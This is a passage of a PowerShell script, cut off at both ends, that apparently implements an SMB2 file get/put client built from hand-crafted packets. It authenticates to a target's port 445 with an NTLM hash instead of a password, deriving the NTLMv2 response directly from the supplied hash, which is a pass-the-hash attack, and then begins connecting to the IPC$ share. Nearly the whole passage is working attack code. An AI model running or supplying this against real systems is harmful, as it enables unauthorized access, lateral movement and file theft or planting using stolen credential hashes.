    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_InputBufferOffset",$packet_input_buffer_offset)
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_FileID",$packet_file_ID)

    if($packet_buffer -gt 0)
    {
        $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_Buffer",$packet_buffer_bytes)
    }

    return $packet_SMB2QueryInfoRequest
}

function Get-PacketSMB2SetInfoRequest()
{
    param ([Byte[]]$packet_info_type,[Byte[]]$packet_file_info_class,[Byte[]]$packet_file_ID,[Byte[]]$packet_buffer)

    [Byte[]]$packet_buffer_length = [System.BitConverter]::GetBytes($packet_buffer.Count)

    $packet_SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_StructureSize",[Byte[]](0x21,0x00))
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_InfoType",$packet_info_type)
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_FileInfoClass",$packet_file_info_class)
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_BufferLength",$packet_buffer_length)
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_BufferOffset",[Byte[]](0x60,0x00))
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_FileID",$packet_file_ID)
    $packet_SMB2SetInfoRequest.Add("SMB2SetInfoRequest_Buffer",$packet_buffer)

    return $packet_SMB2SetInfoRequest
}

function Get-PacketSMB2ReadRequest()
{
    param ([Int]$packet_length,[Int64]$packet_offset,[Byte[]]$packet_file_ID)

    [Byte[]]$packet_length_bytes = [System.BitConverter]::GetBytes($packet_length)
    [Byte[]]$packet_offset_bytes = [System.BitConverter]::GetBytes($packet_offset)

    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",$packet_length_bytes)
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",$packet_offset_bytes)
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

    return $packet_SMB2ReadRequest
}

function Get-PacketSMB2WriteRequest()
{
    param ([Int]$packet_length,[Int64]$packet_offset,[Byte[]]$packet_file_ID,[Byte[]]$packet_buffer)

    [Byte[]]$packet_length_bytes = [System.BitConverter]::GetBytes($packet_length)
    [Byte[]]$packet_offset_bytes = [System.BitConverter]::GetBytes($packet_offset)

    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_length_bytes)
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",$packet_offset_bytes)
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Buffer",$packet_buffer)

    return $packet_SMB2WriteRequest
}

function Get-PacketSMB2CloseRequest()
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

    return $packet_SMB2CloseRequest
}

function Get-PacketSMB2TreeDisconnectRequest()
{
    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2TreeDisconnectRequest
}

function Get-PacketSMB2SessionLogoffRequest()
{
    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2SessionLogoffRequest
}

#NTLM

function Get-PacketNTLMSSPNegotiate()
{
    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($packet_version)
    {
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
    }

    return $packet_NTLMSSPNegotiate
}

function Get-PacketNTLMSSPAuth()
{
    param([Byte[]]$packet_NTLM_response)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

    return $packet_NTLMSSPAuth
}

function DataLength2
{
    param ([Int]$length_start,[Byte[]]$string_extract_data)

    $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)

    return $string_length
}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])
{
    Write-Output "Source must be a byte array when using -Memory"
    $startup_error = $true
}
elseif($Source -isnot [String])
{
    Write-Output "Source must be a string"
    $startup_error = $true
}
else
{
    $source = $Source.Replace('.\','')
}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID_bytes = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
$SMB_client = New-Object System.Net.Sockets.TCPClient
$SMB_client.Client.ReceiveTimeout = 30000
$action_step = 0

if($Action -ne 'Put')
{
    $source = $source.Replace('\\','')
    $source_array = $source.Split('\')
    $target = $source_array[0]
    $share = $source_array[1]
    $source_subdirectory_array = $source.ToCharArray()
    [Array]::Reverse($source_subdirectory_array)
    $source_file = -join($source_subdirectory_array)
    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))
    $source_file_array = $source_file.ToCharArray()
    [Array]::Reverse($source_file_array)
    $source_file = -join($source_file_array)
    $target_share = "\\$target\$share"
}

switch($Action)
{

    'Get'
    {

        if(!$Modify)
        {

            if($destination -and $destination -like '*\*')
            {
                $destination_file_array = $destination.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
                $destination_file_array = $destination_file.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_path = $destination
            }
            elseif($destination)
            {

                if(Test-Path (Join-Path $PWD $destination))
                {
                    Write-Output "Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $destination
                }
               
            }
            else
            {

                if(Test-Path (Join-Path $PWD $source_file))
                {
                    Write-Output "Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $source_file
                }

            }

        }

    }

    'Put'
    {

        if(!$Modify)
        {

            if($source -notlike '*\*')
            {
                $source = Join-Path $PWD $source
            }

            if(Test-Path $source)
            {
                [Int64]$source_file_size = (Get-Item $source).Length
                $source_file = $source

                if($source_file_size -gt 65536)
                {
                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                    $source_file_size_remainder = $source_file_size % 65536
                    $source_file_buffer_size = 65536
                }
                else
                {
                    $source_file_buffer_size = $source_file_size
                }

                $source_file_properties = Get-ItemProperty -path $source_file
                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()
                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))
                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()
                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))
                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()
                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))
                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_change_time = $source_file_last_write_time
                $source_file_buffer = new-object byte[] $source_file_buffer_size
                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)
                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)
            }
            else
            {
                Write-Output "File not found"
                $startup_error = $true
            }

        }
        else
        {

            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)
            {
                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                $source_file_size_remainder = $source_file_size % 65536
                $source_file_buffer_size = 65536
            }
            else
            {
                $source_file_buffer_size = $source_file_size
            }
      
        }

        $destination = $destination.Replace('\\','')
        $destination_array = $destination.Split('\')
        $target = $destination_array[0]
        $share = $destination_array[1]
        $destination_file_array = $destination.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
        $destination_file_array = $destination_file.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
    }

}

if($Action -ne 'Put')
{

    if($source_array.Count -gt 2)
    {
        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)
    }

}
else
{
    
    if($destination_array.Count -gt 2)
    {
        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)
    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))
{
    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)
}

if(!$startup_error)
{

    try
    {
        $SMB_client.Connect($target,"445")
    }
    catch
    {
        Write-Output "$target did not respond"
    }

}

if($SMB_client.Connected)
{
    $SMB_client_stream = $SMB_client.GetStream()
    $SMB_client_receive = New-Object System.Byte[] 81920
    $SMB_client_stage = 'NegotiateSMB'

    while($SMB_client_stage -ne 'exit')
    {
        
        switch($SMB_client_stage)
        {

            'NegotiateSMB'
            {          
                $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID_bytes[0,1] 0x00,0x00       
                $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SMB_version
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                if([System.BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42')
                {
                    $SMB_client_stage = 'exit'
                    Write-Output "SMB1 is not supported"
                }
                else
                {
                    $SMB_version = 'SMB2'
                    $SMB_client_stage = 'NegotiateSMB2'

                    if([System.BitConverter]::ToString($SMB_client_receive[70]) -eq '03')
                    {
                        Write-Verbose "SMB signing is enabled"
                        $SMB_signing = $true
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        $SMB_signing = $false
                        $SMB_session_key_length = 0x00,0x00
                        $SMB_negotiate_flags = 0x05,0x80,0x08,0xa0
                    }

                }

            }

            'NegotiateSMB2'
            {
                $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                $SMB_session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                $SMB2_message_ID = 1
                $packet_SMB2_header = Get-PacketSMB2Header 0x00,0x00 0x00,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
                $packet_SMB2_data = Get-PacketSMB2NegotiateProtocolRequest
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'NTLMSSPNegotiate'
            }
                
            'NTLMSSPNegotiate'
            { 
                $SMB2_message_ID += 1
                $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
                $packet_NTLMSSP_negotiate = Get-PacketNTLMSSPNegotiate $SMB_negotiate_flags
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                $SMB_client_stream.Flush()    
                $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                $SMB_client_stage = 'exit'
            }
            
        }

    }

    if($SMB_version -eq 'SMB2')
    {
        $SMB_NTLMSSP = [System.BitConverter]::ToString($SMB_client_receive)
        $SMB_NTLMSSP = $SMB_NTLMSSP -replace "-",""
        $SMB_NTLMSSP_index = $SMB_NTLMSSP.IndexOf("4E544C4D53535000")
        $SMB_NTLMSSP_bytes_index = $SMB_NTLMSSP_index / 2
        $SMB_domain_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 12) $SMB_client_receive
        $SMB_target_length = DataLength2 ($SMB_NTLMSSP_bytes_index + 40) $SMB_client_receive
        $SMB_session_ID = $SMB_client_receive[44..51]
        $SMB_NTLM_challenge = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 24)..($SMB_NTLMSSP_bytes_index + 31)]
        $SMB_target_details = $SMB_client_receive[($SMB_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
        $SMB_target_time_bytes = $SMB_target_details[($SMB_target_details.Length - 12)..($SMB_target_details.Length - 5)]
        $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
        $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $auth_hostname = (Get-ChildItem -path env:computername).Value
        $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
        $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
        $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
        $auth_domain_length = $auth_domain_length[0,1]
        $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
        $auth_username_length = $auth_username_length[0,1]
        $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
        $auth_hostname_length = $auth_hostname_length[0,1]
        $auth_domain_offset = 0x40,0x00,0x00,0x00
        $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
        $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
        $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
        $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
        $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
        $HMAC_MD5.key = $NTLM_hash_bytes
        $username_and_target = $username.ToUpper()
        $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
        $username_and_target_bytes += $auth_domain_bytes
        $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
        $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                $SMB_target_time_bytes +
                                $client_challenge_bytes +
                                0x00,0x00,0x00,0x00 +
                                $SMB_target_details +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00

        $server_challenge_and_security_blob_bytes = $SMB_NTLM_challenge + $security_blob_bytes
        $HMAC_MD5.key = $NTLMv2_hash
        $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

        if($SMB_signing)
        {
            $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
            $session_key = $session_base_key
            $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
            $HMAC_SHA256.key = $session_key
        }

        $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
        $NTLMv2_response_length = $NTLMv2_response_length[0,1]
        $SMB_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

        $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                $auth_LM_offset +
                                $NTLMv2_response_length +
                                $NTLMv2_response_length +
                                $auth_NTLM_offset +
                                $auth_domain_length +
                                $auth_domain_length +
                                $auth_domain_offset +
                                $auth_username_length +
                                $auth_username_length +
                                $auth_username_offset +
                                $auth_hostname_length +
                                $auth_hostname_length +
                                $auth_hostname_offset +
                                $SMB_session_key_length +
                                $SMB_session_key_length +
                                $SMB_session_key_offset +
                                $SMB_negotiate_flags +
                                $auth_domain_bytes +
                                $auth_username_bytes +
                                $auth_hostname_bytes +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                $NTLMv2_response

        $SMB2_message_ID += 1
        $packet_SMB2_header = Get-PacketSMB2Header 0x01,0x00 0x1f,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
        $packet_NTLMSSP_auth = Get-PacketNTLMSSPAuth $NTLMSSP_response
        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
        $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
        $packet_SMB2_data = Get-PacketSMB2SessionSetupRequest $NTLMSSP_auth
        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
        $SMB_client_stream.Flush()
        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
    
        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -eq '00-00-00-00')
        {
            Write-Verbose "$output_username successfully authenticated on $target"
            $login_successful = $true
        }
        else
        {
            Write-Output "$output_username failed to authenticate on $target"
            $login_successful = $false
        }

    }

    try
    {

    if($login_successful)
    {
        $SMB_path = "\\" + $Target + "\IPC$"
        $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        
        if($SMB_version -eq 'SMB1')
        {
            Write-Output "SMB1 not supported"
        }  
        else
        {
            $directory_list = New-Object System.Collections.ArrayList
            $SMB_client_stage = 'TreeConnect'

            :SMB_execute_loop while ($SMB_client_stage -ne 'exit')
            {

                switch($SMB_client_stage)
                {
            
                    'TreeConnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
